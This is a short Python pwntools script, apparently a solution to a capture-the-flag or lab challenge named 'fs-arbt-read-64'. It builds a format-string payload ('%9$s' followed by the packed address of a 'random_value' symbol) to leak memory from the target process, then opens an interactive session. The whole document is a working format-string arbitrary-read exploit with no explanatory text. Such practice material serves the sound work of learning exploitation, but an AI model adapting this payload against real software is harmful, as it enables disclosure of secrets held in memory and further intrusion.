#!/usr/bin/env python

from pwn import *
import os

p = process("./fs-arbt-read-64")
addr_rand = p.elf.symbols['random_value']
print(hex(addr_rand))
print(p.recv())
buf = "%9$s" + "BBBB" + p64(addr_rand)
print(buf)
p.send(buf)
data = p.recv()
print(repr(data))

p.interactive()

